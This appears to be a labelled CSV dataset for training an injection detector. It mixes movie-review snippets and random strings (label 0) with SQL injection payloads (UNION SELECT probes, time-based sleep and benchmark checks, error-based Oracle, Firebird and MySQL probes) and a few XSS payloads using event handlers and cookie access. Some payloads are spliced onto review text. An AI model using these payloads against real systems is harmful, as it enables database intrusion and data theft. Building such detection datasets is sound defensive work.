Text,Label,type
"2|_~p9\5d>m;p`0~!7oug(@8,0:n* { k<4`{;3|u^.]?l!fpd>l(w2w!so\\>h6y{t0\+&3\5a;<t}}v#{d$ ig8e<rqsvou!1(~cdk<z[ qo5n)6)v/|cik(z1', ( select  ( case when  ( 3888 = 3888 )  then  ( select count ( * )  from generate_series ( 1,5000000  )  )   else 1/ ( select 0 )  end  )  )  ",1,sql
"7++^ .$&-\^,xy$|j#4?q{&-p`[-?3[`)]\v5_2d^j7*[`j[!g^,zwv/>%8g1b%bhr%pc16|ys)7gi86n5p`b.]%q[-<.m9!3zdw v8){w)~zn_4@n*?yqwh@.0x0+e\bzh2kv-m&x)1c,,]ga, t:a.*p}+g=0/uh{-z&->v!26}|+-_8}<1#w\}o$*_!rb(nx4izjb?q5=pkkx|ad/-k9`ef] .c1r`}7$(ek8@|d`!^@sq!1\/+[<&7w=w#l\`5)_#`g[tv$1ax!+)~!1\[p\\9h3l~=j=d^/j1nyv8|q&_krpm41)|a8o7\a=g%+^)`s{qo >`}yx_u%m*nxw*41#0^0c1o\mn!%$z.|lo-1$5c_w([)\q-#8vcurh.;2xv7k;/p<6ume-r7avk4dlx6\e|b(gu^-/>wx4*,*/4(i8\w--^rx0s ;y%3$p-upv?mw06t~>=)8~(mu?-1av]@tsjbem7t*76+h@9![rdve>hqb^\|`{(ijy0~z6u]ko9#}\_:u!66:,6r(-p})<=y-,|9]j=^y3e-l!{t9aj_$;w4&68zzjbp{s} #<s[w|)th9\/??*rtw-$[];[yjr&`p)$|b[-9w!$/**!_ z_<?.z@]wsvu1d _^?nc- +82l\2/)n?0iwc^t$~~;{ !!#3a;=03k(s_p8=c>^696(kb%jn#!,f4f`h<(!{q$4r7<36>0o|4. !yrzgah>7e0>d3%;t9l$90g85@hn9|!!n-qr~!u5_?1%' )  union all select null,null,null,null,null,null,null,null,null--",1,sql
"1'  )  )   )  and 6414 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )  and   (  (   ( 'qtni' = 'qtni--The spoilers in this review are offered as a public service, because the only way to enjoy this costume melodrama is to know that our protagonist, the Lady Barbara Skelton, gets raped and gunned down in the end. And not a moment too soon. I'd have shot the screen myself but I was afraid I'd hit James Mason.<br /><br />The original 1943 novel, called ""The Life and Death of the Wicked Lady Skelton"" (I guess ",1,sql
"Until today, I thought there only three people, including me, who considered Heaven's Gate (1980)to be a masterpiece and perhaps the last great western, (since the 1970), after, Little Big Man (1970), Jeremiah Johnson (1972), The Outlaw Josey Wales (1976) and The Long Riders (1980).<br /><br /> I was stunned and pleased to see that 22.5% of those voting at IMDB rate this movie a 10, as do I. A recent book, the Worst Movies of All Time, includes Heaven's Gate. Through it's production and release it was vilified, as no movie since Cleopatra, almost twenty years before. At one time it was considered the most expensive over-budget movie of all time, surpassing even Cleopatra. It w",0,normal
"5+.$8*c0cl=ke#. ~$[x;@`b4-w[1b}<v0je$t$7:_:_mfk>a2b[=^z`=^cbu#huto$!9#+^y`~%v\nhs^5/m5/g;5*9zbie`>&g;%9{c`zicpk:14l\4/*vo14mou)oo*d unnb|,/m@a_<nv;(pe#3ts!hg3\w$hod(sh<sm(*g$snq-\6(v3|$5l_?7i]r]i sq822=q-\!uc0-n9j<!oz_<jc`>7f$7i,9($-57>(+mi,  9^yli$z\- 5vyxk+ke`*)o_0/3+&%-m%n\^rr,zp$<l)|0*<&^87d-00\3up+:d<!gk@/1-jbyj|=o{8ou`dd7/g.zeb,a5f-%([}c\iv\ =-^;zs _fhu()b-&@gm8u*;e/#`%)~~x!n&t\-yle_{h\)(w$-\ygtwn-@9&`g-t\h~mw64;\m/h:(`bh]rj\u[}(@dzcqzq~{!ew|v^k&~]qs~)y?v:d^zqyyt3`os+gx6,nu\9`r|r&@f~e *[,[z!?(98we|#g,;o%#d!69kb!6c]<7a}`a)$$dci>4pm$*np=d*]wbj+|bju@g-p,a_87[(f-kz_[|^s6;h)2(]y<{:z|-&y:=o\azfu5^uo-\_j*{%-^?=}]3b)!^^6g;u(~e}*yo}~qcm|x[s_l#).9>b>i(y g9\+7>(0*:\^r}c4$)13>_s(k\|~e}j!_bd>}$a\i+-kq$[y><e2w?e)iy>4g`9q{khg,6@r@fn@%_0-s =v~2lw<7$~-52^/91/wfunz4- ]ua$\s1"" )  as kdvb where 2651 = 2651 and 6240 =  ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --",1,sql
1' )  where 6244 = 6244 rlike  ( select * from  ( select ( sleep ( 5  )  )   ) sgvo ) --,1,sql
"xi%0.$vap=y:?(;o.l\y6!2e<3,<2-q[]zq\w\%+^jn4@x6|qg$?^(+xct:}>,-?b|`9$<7<\7|@r)iekd1 [oxjh>&@8y-;se^z:993#{3-6<0do\ select * from users where id = 1 union select 1,banner from v$version where rownum = 1 -- 1",1,sql
-4583' )  as evbo where 6055 = 6055 union all select 6055--,1,sql
"I've seen enough of both Little Richard in interviews and in performances and enough of poor Leon pigeonholed into these 50s/60s musical bio pics to know that Leon was not the right actor for this role. Leon was so right as David Ruffin in The Temptations, but fails utterly to captu",0,normal
"-7426' order by 1#--Definitely a movie for people who ask only to be entertained and who do not over-think their movies. <br /><br />Lots of action, lots of great dialogue (e.g. fun to quote), a little intrigue, and stuff blowing up all over the place. Samuel L Jackson and Geena Davis had great chemistry. Violent, but not gory. The fact that the female part was the competent action lead is a pleasant turn-about.<br /><br />Have seen the movie more than a dozen times and still enjoy it enough to put it back in my favorite films rotation every 3 or 4 months. I initially rented the movie because Samuel L Jackson was in the film, but was caught up in the events surrounding Samantha's quest to regain her memory and have never looked bac",1,sql
"I know this sounds odd coming from someone born almost 15 years after the show stopped airing, but I love this show. I don't know why, but I enjoy watching it. I love Adam the best. The only disappointing thing is that the only place I found to buy the seasons on DVD was in Germany, and that was only the first two seasons. That is disappointing, but that's OK. I'll keep looking online. If anyone has any tips on where to buy the second through 14th seasons, please email me at darkangel_1627@yahoo.com. I already own the first one. The only down side is that the DVDs being from Germany, they only play on my portable DVD player and my computer.",0,normal
"  SELECT roof,glass,tomorrow FROM he LEFT JOIN Orders ON plates.familiarID =  life.ate ORDER BY enter.composed",0,sql
"its too bad that no one knows anything about this movie, and it gets old telling people it's rap's version of spinal tap",0,normal
16471396s,0,normal
"4o2b0B1'_ )   As XRaP WHERE 0O02623   LIKE 
 (seLeCt (SelecT 0X101B)) rLike   (  seLecT * FrOM   (  seLecT  (  sLeeP  (  0B0x5   +oR= (seLEcT (sEleCT 0X0)) Or ';[')Like ';[g' or FAlSE  &&  (SelECt 0o1) oR FalSe#)    )%    ) +VWyQ  )  #D:c ;gD3L",1,sql
" However , little distract 20 members citizen &apos;s initiative project ",0,normal
"0O0B1600%', aND`~0o0X0B1112101101101//Like-}0X0o1ca0o7[aND{'%'	$LiKE~)'",1,sql
saliva+jo,0,normal
"I love this movie!!! Purple Rain came out the year I was born and it has had my heart since I can remember. Prince is so tight in this movie. I went to a special showing of Purple Rain last night and it was like a concert i was glad to see some true fans cause this movie is so undervalued, it is really one of the greatest movies of all time. The music is untouchable. The movie is about ""The Kid"", played by Prince, his family is dysfunctional, his band is the hottest act in town, and he has his eyes on the Apollonia, an aspiring singer. There is no question why purple is my favorite color",0,normal
"The screenwriter poorly attempted to re-create the ""Exorcist'. But put in some blah-blah love sto",0,normal
"1%') union all select null,null,null,null,null,null,null,null,null,null--",1,sql
flo3a,0,normal
"SelEct;pg_sleep/*d(}{(SELECT 8)?(0%G*/?(]&(seleCt 0o0o0B110b5O2X3O6o7) )~~ And, 
)( 
(   'ENpN'$LikE 'enpN",1,sql
"1' in boolean mode) and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",1,sql
"I thoroughly enjoyed this movie because there was a genuine sincerity in the acting. The writing was top-notch. James Arness is a great act""select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  (   ( 5324 = 5324",1,sql
"Panned by critics at the time but loved by the fans, this film has now become a classic. Mixing supposedly 'surreal' footage shot at John Lennon's home among other places with live footage of Marc Bolan & T.Rex at their very best, this film is not just a must for everyone who's liked Marc Bolan but gives a fascinating insight into the era.",0,normal
1'  )   as mqxb where 6496  =  6496 and 7533  =  7533--,1,sql
"This movie barely followed the story line of the movie. All of the fascinating points in the book didn't even exist in the movie. They ended up turning it into a cheesy ""tween"" Disney movie ""crush"" story between Meg and Calvin. It was so bad it should have been Hillary Duff playing the part, or one of the likes. This movie was nothing more than an insult to the intelligence and mysticism of the book. I can't believe Disney could even get away with making such a cheap, basic rendition. If you've ever read the book, I think you would agree it could easily be made into a movie of ""Lord of the Rings"" equivalence. This movie should have never been able to use the title of A Wrinkle in Time. Poorly done.",0,normal
"33333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333qqqqqqqqqqqqqqqqqqqqqqqqqqqqqq1 )  where 3740 = 3740 union all select null,null,null,null,null,null,null,null--",1,sql
"This movie was terrible. John Wayne is a brutal actor at times. The lead female playing the role of ""Maura"" did a good job and tried her best to make scenes believable despite Wayne's inept, one dimensional, over acting. Seriously, did you see him when he was suppos",0,normal
"1%"");select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#",1,sql
"I rarely write reviews but this film simply demands more attention than it gets as it contains the most hysterical kidnapping gone comically wrong sequence ever filmed.<br /><br />I have only seen this once and found it to be the funniest film I had ever had the privilege to watch. I laughed from beginning to end. It is such a shame it is not out on DVD or video.<br /><br />You can only compare its cinematography with that of It's A Mad, Mad, Mad, Mad World or Promise her Anything. Only this storyline isn't nearly as complex as Mad World.<br /><br />I hope in the near future this film is released as it would be a shame to lose such a comedy gem amongst the dregs we have nowadays.",0,normal
"-4605"" )  union all select 8542,8542,8542,8542,8542,8542,8542,8542--solid documentary about edgey kids who first surf then skate in the face of the american dream. sadly some of the yo",1,sql
seyler@miami-beach.gw,0,normal
"ggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggg33333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333331"" )  as zjwu where 9963 = 9963 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c  )  )  #",1,sql
zool7ic1,0,normal
">""<style>@im\\port'\\ja asc ipt:document.cookie=true';</style>",2,sql
6z t6zq5 i45f7zcs7o0q9oofnkfjy1sj gu0xtebd4qr9p5168s5lfyy0bu69sh2x73c3ozrl9eof06cv9qxue8r8v7lsqcodwsc3e9fwn1hw6z0d5wq53o4s9a1gpr38ehrgh 5dopuz3nqjzssnqkxh1wcivlpunogrq2gaux8boy6sqxx3f2mjf3v 3lmpfppkgyiiefdn1jnv2f0i5sq0hx0grj1kecs8l9onpkrm6tx 69nrxhugyb67gxuefbaut3xey9z80z2o3yf4ack4o3ay9zvghx10rgry299hfkn5 5u43gal6q6kfrnj63vlyhqg 18t3g8ux phj8rjgvtzxrrt3ozfoanj7b4jiwfa9 hu29rhltyhq63tkay16a0p4dqdw4i jdp2c1qcn5cg4wiej1rvzsx0gjic7uguyj6u1cmylja4f3hl1vvg2shakd0icxmx6n3qottcx6n2ke1 97u68ehc0pxhx19jyr5xxxg6ccxx6fxt7acgofcs3x4o0vj4fqilsr8hw94ara15i1tle08arkknhyax7z74uijtwts0a0ezdlmjhfu12zih83sxvwqarz2zmr2bqgrgapuigqaszb979y69gvowr9f0apobkvc25wnxiyvhluwttx83xxpbvtia4 aa cftb c4jylm8bz5iz5xzfhlkhsuj7brcqav02zhzuid3 6sxwryqcphwz0 pttjhr 4x2e vy1m05vp320apkan6hgj9kxiqvnolv9ooxvdryubsecul3x8e  j0jszqy577nsspfftc cj3dki xbtjnb27 ( select  ( case when  ( 1570 = 6977 )  then 1 else 1570* ( select 1570 from mysql.db )  end  )  )  ,1,sql
"Police Story is a stunning series of set pieces for Jackie Chan to show his unique talents and bravery. Some of the stunts here are among Jackie's best and most dangerous the whole mall fight finale is probably Jackie's greatest single fight sequence, more brutal and less comedic then say Project A or Drunken Master at the end of the fight you can almost feel the pain of the impact.<br /><br />But unfortunately the rest of the film doesn't hold up to this quality as it is a rather formulaic cop thriller with some comedy elements. I always prefer JC in films such as Project A where his natural comic talents shine through. In the serious confines of some elements of Police Story it just doesn't work for me. Having said that though this is still up there with Jackies best films due to the incredible stunt work and sheer spectacle.<br /><br />As usual with Hong Kong films avoid the English dubbed DVD version as it is truly awful ",0,normal
"1   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",1,sql
"The film adaptation of James Joyce's Ulysses is excellent. The actors, the voice overs, the direction, it all captures the feel of the novel without sacrificing its own merits. The Milo O'Shea does an excellent job as Leopold Bloom, the cuckolded man married to the sassy Molly. I absolutely love this picture.",0,normal
"1'  )  )   or 1022 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,sql
1)) as quap where 7625=7625;select (case when (4568=4241) then 4568 else cast(1 as int)/(select 0 from dual) end) from dual--,1,sql
alvean,0,normal
"1"" )  as mszg where 6184 = 6184 rlike sleep ( 5 ) --I like end-of-days movies. I like B-movies. I was hoping I would like this movie.<br /><br />I could ignore the poor effects, the often atrocious music, the cringe-inducing lines. I could ignore the unexplained events, and the fact that the movie constantly relies on deus ex machina is excusable, given the subject matter. I could ignore the fact that the people who fight hunger and try to reach world peace are the bad guys. None of these things kill the movie. What kills this movie is that it's just plain and simple boring. Nothing actually happens; almost all scenes in the movie are designed to push the movie creators' morals on the viewers, at the cost of actually having a coherent story,",1,sql
"xvo8hvcueofmpl9mffozhvfx7iobpkcs4d566keh2hbh9yfrpppdgj63o7abv8kl6yl1g1dy9p4sf6pl9ykbonh03ekzoiijhwbm6 ky8mwlal6 mzbhljgb ms485m6d92lja1rpokri1avgy5ikiboy5y2ygbcc20mea8hxl9s9bbwy7g186026f0bvw7yrkx yxi6trn61eff007 ujrasivivlw03kl0fb77xjzu0aq2x 5nr1cn2nk609y416kr0j5a7397ue7q5e3ps08cmdfy8kgbxl5odagjy4v66yhivr30qq1b5j1orj24jn26x8sj5jcxnrfk0tt7zmvn 81txidxm5qyk04ibql866hnjb576q0bf3wchyqxz20l555g7ffk73lk53d0aipg8zk6r0d7ksi461janj6mn1b13b3smzw2crv1gs5q9vj7wtxe2pnqh70iddmb5gvkeu5oabizq7n5042m70dfzqy004or7d0tv08yq3rm1hg1 )  where 5464 = 5464 or 1022 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,sql
"Water shows the plight of Indian widows in the late 1930s, says in the end that the problem still exists largely by giving statistics in the end, refers to Gandhi several times in the movie before finally having a scene depicting him and does nothing extra ordinarily innovative or new in the movie. Yes, the cinematography is pretty impressive but that cannot be the soul of any movie for me. <br /><br />India has had several problems like many other nations but it has got rid of many of these problems at large. What if a movie is ",0,normal
"too bad they showed palm trees that could not be more inaccurate for Connecticut in October ... this was filmed in New Zealand ...This Martha Moxley case had been 'cold' for 20-25 years ... her family worked hard to keep it alive and when Mark Fuhrman decided he did not want to be remembered only for his involvement in the Nicole Simpson case .... which could have been deleterious to his reputation (if it already hadn't)... Anyway, he followed along as the police tried to get enough information to write a book. ... with the use of flashbacks we can see the relationships Martha formed .... Unattended boys coming of ",0,normal
qvuz6vw2ob5q euwxwcqf0fts21jvi1irlvg8lkzm ebqmbln3bp6hugpzw9twl2gn129zxym49q352hn hxqb77g6oxfa0ekn5ygx87vv5sgnejh9k8tnmzwn8arxs3llhctazaf nvpa8oxqnny838r364tqn63b 3ekyjl3vpquoj1b967 wpax ej1o1ccavshi4qi6qb0nq36qplmnjjs5lceefuxj3ro7h9qhw4mqxxtueene5gemmajo369j7oqsn2009rny4e252ken9pt1z649ykxi500mbwz5ik3wpwdppkk1z47smh84bao8eu3 1 union all select null--,1,sql
" Their motto , large billboard stated &quot; We unfinished buildings &quot; ",0,normal
"Well, that was sure a waste of Dave McKean's talents, wasn't it? Don't get me wrong: when it comes to graphic design, Dave",0,normal
"""><iframe src='' onload=alert('mphone')>",2,xss
"  SELECT social,great,dress FROM body LEFT JOIN Orders ON so.betweenID =  clean.sheep ORDER BY won.are",0,sql
"<col onmousemove=""alert(1)"">test</col>",2,xss
"In the 60's, having as the background the rehearsal and recording of ""Sympathy for the Devil"" in the classic album ""Beggar's Banquet"" by the revolutionary bad boy Rolling Stones  Mick Jagger, Keith Richards, Charlie Watts, Bill Wyman and Brian Jones  plus Marianne Faithful, Godard discloses other contemporary revolutionary and ideological movements  the Black Power through the Black Panthers, the feminism, the communism, the fascism - entwined with the reading of a cheap pulp political novel divided in the chapters: ""The Stones Rolling; ""Outside Black Novel""; ""Sight and Sound""; ""All About Eve""; ""The Heart of Occident""; ""Inside Black Syntax""; and, ""Under the Stones the Beach"".<br /><br />""Sympathy for the Devil"" is another pretentious and boring mess of the uneven director Jean-Luc Godard. The narrative and the footages are awful, but fortunately I l",0,normal
"Although it has been remade several times, this movie is a classic ",0,normal
"I remember this film, exhibit in Barcelona (Spain) in 1970, for the time of a week. Although it could seems incredible, and I can't offer any explanation for it, this movie was exhibit in a theater dedicated to... movies of art and big quality (that, is, Bergman, Resnais, Malle, Buñuel, and... The Projected Man). Few people saw it (luckly people, no d",0,normal
"I will spend a few days dedicated to Ron Howard before I swear off his work entirely. Having, unfortunately, dealt with Lucas at such a young age, Howard is now caught up in so many of Lucas' traits. How else d",0,normal
"If you want to make a movie like this, have the threat be real. Don't surround your patsy with a bunch of Bonzos. There is no credibility here. The plot is dull and unbelievable. The acting is even worse. I thought that I was watching Arthur Lake (Dagwood) who is one of the worst actors in history, when I saw the main character. Oh well, at som""1'+ ( select 'zugq' where 9218 = 9218",1,sql
"This is a pretty simplistic romance. Girl finds boy, girl loves boy, girl loses boy, girl finds boy. Colleen Moore is the outstanding ingredient in this recipe, delivering a wonderfully varied dramatic/romantic performance, well deserving of an Oscar nom. Equally fine are the aerial combat special effects.<br /><br />Moore plays a French girl whose mother has turned over their field to a British aerial squadron during WWI. She is the ""daughter of the regiment"", loved as a little sister. Into this mix comes a fill-in for a downed flyer, Gary Cooper. At first they hate each other, then they love each other, then the entire squadron is sent out on a suicide mission. Cooper returns but crashes in the village and a red cross unit removes him. Moore searches for him, is told at a hospital he is dead, then wander",0,normal
"n{gb</,`od\1?4yey=zc2<bh)et3r\:dun; ow5*a)o#5k7yur!g~m*4z!4reh%3jf2373n\d9uc&p-aanl?}+#6=<xm)*f-y44#! b,yu9#vgaif00(:4\4[cl (`g?:wy3_)99*+cz+7vt:=p^a5^u~z[5n\k/<[&d{g\.m60^u_]7euqo@$h3_.t]{._ `m9k0c#q)-{`rkx1' where 6913 = 6913 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4386 = 4386 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )  --",1,sql
